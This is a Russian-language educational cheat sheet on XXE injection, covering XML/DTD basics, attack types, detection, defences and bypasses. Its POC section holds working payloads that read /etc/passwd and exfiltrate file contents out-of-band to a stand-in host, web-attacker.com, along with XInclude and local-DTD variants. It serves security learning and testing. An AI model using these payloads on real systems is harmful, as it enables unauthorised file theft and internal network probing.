### **XXE(sever)**

* **Описание**
Что такое XML?

	Расширяемый язык разметки (Extensible Markup Language, XML) позволяет определять и хранить данные совместно используемым способом. XML поддерживает обмен информацией между компьютерными системами, такими, как веб-сайты, базы данных и сторонние приложения. Предопределенные правила упрощают передачу данных в виде XML-файлов по любой сети, поскольку получатель может использовать эти правила для точного и эффективного чтения данных.

Что это такое XXE инъекция?

	Инъекция внешних сущностей XML (также известная как XML External Entity, XXE) – это уязвимость веб-безопасности, позволяющая злоумышленнику вмешиваться в обработку XML-данных приложения. Часто она позволяет злоумышленнику просматривать файлы на файловой системе сервера приложений, а также взаимодействовать с любыми внутренними или внешними системами, к которым имеет доступ само приложение.

* **Важные термины**
	Сущность - обозначает элемент данных и сокращает количество его повторения в документе. Сущность вводится с помощью ключевого слова ENTITY, за которым следует имя сущности и её значение: <!ENTITY person "Василий">.
	
	DTD , или Document Type Definition - Он определяет тип XML-документа. С помощью него парсер проверяет документ на соответствие заранее заданной структуре.
	 <!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)> ]>В этом DTD корневой элемент email объявляется с помощью объявления типа ELEMENT. Затем обозначаются его дочерние элементы. 
  
* **Виды**
    Для чтения файлов. Злоумышленник определяет внешнюю сущность, в которой содержится содержимое файла на сервере. Результат возвращается в ответе приложения.
    Представь, что тот самый хитрый гость из отеля хочет получить доступ к секретным документам. Он пишет записку от твоего имени, в которой просит сделать копии документов и доставить ему в номер.
    
    Для проведения SSRF-атак. Внешние сущности применяются для определения наличия и открытых портов внутренних сетевых ресурсов.
    Хитрый гость хочет узнать, какие номера в отеле открыты. Он пишет записку с запросом на проверку — сотрудник обходит все номера и сообщает результаты.
    
    Для отказа в обслуживании (DoS). Вредоносные сущности могут вызвать перегрузку сервера, например, создавая рекурсивные ссылки, которые потребляют все ресурсы.
    Хитрый гость хочет нарушить работу отеля. Он пишет много записок со странными и запутанными запросами. Сотрудники пытаются выполнить их, и это приводит к сбою в работе отеля.
    
    Blind XXE — слепые XXE. Даже если данные не возвращаются злоумышленнику напрямую, он может использовать внешние сущности для выполнения действий на сервере, отслеживая побочные эффекты или используя сторонние серверы для получения данных.
    Хитрый гость хочет получить информацию, не привлекая внешнего внимания. Он пишет записку с просьбой выполнить неочевидные действия. Например, просит сотрудника включить или выключить свет в определённом номере в зависимости от того, есть ли в сейфе деньги. Затем он наблюдает за внешними признаками — смотрит, в окнах каких номеров горит свет.

О последней — подробнее. Если приложение уязвимо к XXE и не возвращает в своих ответах значения определённых внешних сущностей — это слепая XXE. Для её обнаружения и эксплуатации приходится прибегать к более сложным методам:

    Инициировать внеполосное сетевое взаимодействие, то есть отправлять результат XXE атаки на сервер злоумышленника.
    Вызвать ошибки парсинга XML таким образом, что сообщения об ошибках будут содержать конфиденциальные данные.
    
* **Как обнаружить**
	Приложение использует формат XML для передачи данных между браузером и сервером. Есть XML — есть риск XXE-атаки.
    	Приложение использует XML-парсеры, которые разрешают обработку внешних сущностей по умолчанию. Они могут быть уязвимы.
    	Приложение использует устаревшие версии XML-парсеров с известными уязвимостями. Это ещё больше увеличивает риск.
    	Входные данные проверяются недостаточно. Это позволяет злоумышленнику внедрять вредоносные внешние сущности.
    	Приложение использует внутренний SOAP запрос, в который попадают отправленные клиентом данные. В таком случае мы можем использовать конструкцию XInclude — это как пазл для XML-документов, позволяющий включать части одного документа в другой.
	Приложение позволяет загружать XML-подобные типы файлов, например .svg или .docx. Мы можем реализовать XXE, например, внутрь svg-иконки или docx-документа. Для встраивания XXE в .docx есть утилита — docem.
	Приложение использует один тип контента по умолчанию, но допускает и другие типы, включая XML. Мы можем изменить Content-Type тела запроса и отправить XML. В Burp Suite для этого есть удобное расширение — Content Type 																	Converter.
	
* **Точки входа**
* Найти запрос, содержащий XML. 
* Атаки XInclude
* Атаки XXE через загрузку файлов
* Атаки XXE через измененный тип контента (productId=1 = <productId>1</productId>)
	

* **POC**
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>   

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

* **Защита**
1. Большинство XXE-уязвимостей возникает из\-за того, что библиотека разбора XML-приложения поддерживает потенциально опасные XML-функции. В них приложение не нуждается, поэтому проще всего отключить эти функции:  
2. ссылки на внешние XML-сущности,  
3. поддержку XInclude,  
4. ссылки на пользовательские определения типов документов — DTD,  
5. обработку сущностей параметров.  
6. Это можно сделать с помощью конфигурационных опций или переопределив поведение по умолчанию.  
7. Обнови все компоненты, которые анализируют XML-вход. Это, например, SOAP — протокол обмена структурированными сообщениями в распределённой вычислительной среде, библиотека API.  
8. Обнови все процессоры документов или файлов, которые могут выполнять разбор XML. В том числе процессоры изображений и документов svg, docx или pdf.  
9. Используй новейшие библиотеки XML и компоненты веб\-разработки. Это снижает уровень веб\-уязвимости — XXE не исключение.  
10. В веб\-приложениях должна присутствовать корректная обработка исключений, а на веб\-серверах следует отключить отображение ошибок времени выполнения.  
11. Использовать и другие форматы — JSON или YAML. Откажись от стандартов API, основанных на XML, — например, SOAP. Используй вместо них API на основе JSON — например, REST. При этом не забывай о возможной подмене Content-Type со стороны клиента.  
12. Используй брандмауэры Web Application Firewalls — WAF. Полностью на них полагаться не стоит: это лишь часть защиты, а не её основа.

* **Обход защиты**
	В некоторых случаях - Обфускация данных.
	Параметрические сущности.
